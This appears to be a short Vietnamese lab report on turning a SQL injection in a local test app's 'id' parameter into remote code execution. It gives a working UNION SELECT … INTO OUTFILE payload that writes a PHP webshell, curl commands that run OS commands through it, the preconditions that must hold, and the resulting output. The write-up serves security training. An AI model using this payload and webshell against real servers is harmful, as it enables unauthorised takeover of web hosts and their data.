# Task 5: Báo cáo ngắn - SQLi dẫn tới RCE qua INTO OUTFILE

## 1. Mục tiêu
Từ một điểm SQL Injection ở tham số `id`, suy ra payload phù hợp để ghi webshell và thực thi lệnh hệ điều hành.

## 2. Cách nhận diện lỗ hổng
Endpoint dùng GET `id`: `http://localhost:8006/?id=...`.
Query trong code nối chuỗi trực tiếp:
```sql
SELECT id, username, email FROM users WHERE id = '$id'
```
Query gốc có 3 cột (`id, username, email`) nên phần `UNION SELECT` cũng cần 3 giá trị.

Khung payload:
```sql
1' UNION SELECT col1,col2,col3 ... -- -
```

### SQLi lên ghi file
Muốn RCE qua webshell thì cần ghi file `.php` vào thư mục web phục vụ tĩnh.

Suy ra payload cuối:
```sql
1' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/uploads/shell.php' -- -
```

Lý do chọn payload này:
- `1` và `3`: lấp cột số cho đủ 3 cột.
- Cột giữa là PHP shell.
- `INTO OUTFILE` ghi kết quả query thành file shell.

### Trigger RCE
```bash
curl "http://localhost:8006/uploads/shell.php?cmd=id"
curl "http://localhost:8006/uploads/shell.php?cmd=whoami"
```

## 4. Điều kiện 
1. DB user có quyền `FILE`.
2. `secure_file_priv` không chặn ghi (`""`).
3. DB và web cùng nhìn thấy đường dẫn `/var/www/html/uploads` (shared volume).

## 5. Kết quả 
1. Payload ghi shell thành công (`Query executed successfully`).
2. File shell được tạo ở `/uploads/shell.php`.
3. Gọi shell trả về output hệ điều hành:
```text
uid=999(mysqlshare) gid=999(mysqlshare) groups=999(mysqlshare)
mysqlshare
```

